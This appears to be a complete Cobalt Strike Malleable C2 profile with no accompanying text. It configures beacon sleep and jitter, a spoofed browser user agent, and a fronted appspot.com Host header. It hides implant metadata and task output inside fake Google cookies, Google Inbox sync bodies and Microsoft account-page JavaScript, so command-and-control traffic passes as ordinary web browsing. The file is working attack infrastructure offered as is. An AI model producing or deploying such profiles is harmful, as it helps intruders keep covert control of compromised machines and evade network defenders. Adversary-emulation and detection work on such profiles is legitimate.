set sleeptime "15000";
set jitter "20";
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";


http-get {
  set uri "/_/scs/bt-static/_/js/k";

  client {
    header "Host" "example.appspot.com";
    parameter "sid" "12938120";

    metadata {
      base64;
      prepend "NID=";
      append ";";
      header "Cookie";
    }
  }

  server {
    header "Cache-Control" "public";
    header "Server" "sffe";
    header "X-Frame-Options" "SAMEORIGIN";
    header "Vary" "Accept-Encoding";
    header "X-XSS-Protection" "1; mode=block";

    output {
      base64;
      append "<![CDATA[*/var aFirstName,aLastName,aMemberName,aCid,aAuthenticatedState=window.top.msCommonShell.AuthState.NotSignedIn,userData={idp:window.top.msCommonShell.SupportedAuthIdp.MSA,firstName:aFirstName,lastName:aLastName,memberName:aMemberName,cid:aCid,authenticatedState:aAuthenticatedState};aMemberName!==\"\"&&window.parent.MSA.MeControl.API.setActiveUser(userData)/*]]>*/</script></div></div></div></div></div></body></html>";
      print;
    }
  }
}

http-post {
  set uri "/sync/st/s";

  client {
    header "Host" "example.appspot.com";
    header "Origin" "https://inbox.google.com";

    id {
      base64url;
      prepend "NID=";
      header "Cookie";
    }

    output {
      base64;
      prepend "{\"2\":{\"1\":\"00000015";
      append "16286067364\",\"4\":44}}";
      print;
    }
  }

  server {
    header "Cache-Control" "no-cache, no-store";
    header "Pragma" "no-cache";
    header "Expires" "0";
    header "X-Content-Type-Options" "nosniff";
    header "X-XblCorrelationId" "2c9bf2cd-0aca-4bc9-8e9d-1db64975008d;";

    output {
      base64;
      prepend "{\"ipv\":false,\"pvm\":\"";
      append "\",\"rej\":0,\"bln\":0,\"acc\":1,\"efi\":[]}";
      print;
    }
  }
}
